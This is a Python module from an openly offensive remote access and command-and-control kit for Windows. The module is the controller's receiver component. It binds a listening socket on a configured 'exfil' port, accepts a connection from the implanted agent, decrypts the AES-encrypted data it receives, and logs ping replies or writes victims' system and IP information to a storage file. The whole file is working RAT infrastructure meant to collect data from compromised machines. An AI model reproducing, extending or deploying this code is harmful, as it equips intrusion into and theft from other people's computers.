#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.0
# -------------------------------------------------------------
import socket

from ..logging.logging import ConsoleWindow
from ..encryption.aes128 import Decryption
from ..networking.IP_Handler import IPAddress
from ..utils.file_paths import DSFilePath
from ..logging.logging import NetworkingConfigs


BUFFER = 4096


class ReceiverSocket:

    def __init__(self):
        self.host = IPAddress().get_local_ip_from_interface() #init local ip address
        self.port_number = NetworkingConfigs().retrieve_exfil_port()    #init exfil port number

    #Function will create a receiver socket for exfiltrating date from the agent
    def create_receiver_socket(self):
        self.recvr_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   #Create socket object
        self.recvr_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)   #Allow socket to bind to port with out error
        self.recvr_socket.bind((self.host,int(self.port_number)))               #Bind the socket to the host ip and port
        self.recvr_socket.settimeout(10)                                        #Set socket timeout to infinite
        self.listen_for_message()

    #Function will listen for a single connection
    def listen_for_message(self):
        self.recvr_socket.listen(1)             #Listen for a single connection

    #Function will accept the connection, get the encrypted data, close all the sockets, decrypt the data and return the plaintext data
    def get_data_from_client(self,encryption_key):
        try:
            global client_socket                                    #Make client socket object global
            client_socket, client_addr = self.recvr_socket.accept() #Accept the connection
            data_from_client = self.recv_all_data_from_client()     #Receive all the encrypted data from the client
            client_socket.close()                                   #Close the client socket
            self.recvr_socket.close()                               #Close the receiver socket
            plaintext_data = Decryption().decrypt_data(encryption_key,data_from_client) #Receive & decrypt data from client
            return plaintext_data                                   #Return plain text
        except socket.timeout:                                      #If socket timesout
            self.recvr_socket.close()                               #Close the socket
            return ''                                               #Return empty string

    #Function will receive all data from the client
    def recv_all_data_from_client(self):
        bytes_data = b''                                    # Create empty byte string
        while True:                                         # Create infinite loop
            partial_data = client_socket.recv(BUFFER)       # Receive encrypted data from server
            bytes_data += partial_data                      # Add each itteration to empty byte string
            if not partial_data:                            # If the data is an empty string, all data has been sent
                break                                       # Data transmission is complete. Break the loop
        return bytes_data                                   # Return byte data string sent from server

    #Function will receive ping reply and log it to the gui console
    def recv_ping_reply(self,encryption_key):
        self.create_receiver_socket()                           #Create socket & listen for connection
        ping_reply = self.get_data_from_client(encryption_key)  #Accept the connection, process reply, close connection
        ConsoleWindow().log_to_console(ping_reply)              #Log the reply to the console window

    #Function will receive sys/ip command out put from client and write to a file
    def recv_sys_ip_info(self,encryption_key):
        self.create_receiver_socket()                                   #Create receiver socket
        info_exfil = self.get_data_from_client(encryption_key)          #Get the data from the client and decrypt it
        with open(DSFilePath().sys_info_file,'w') as client_info_file:  #Open the sysinfo.txt data storage file
            client_info_file.write(info_exfil)                          #Write the info rcvd from the client to the file
            client_info_file.close()                                    #Close file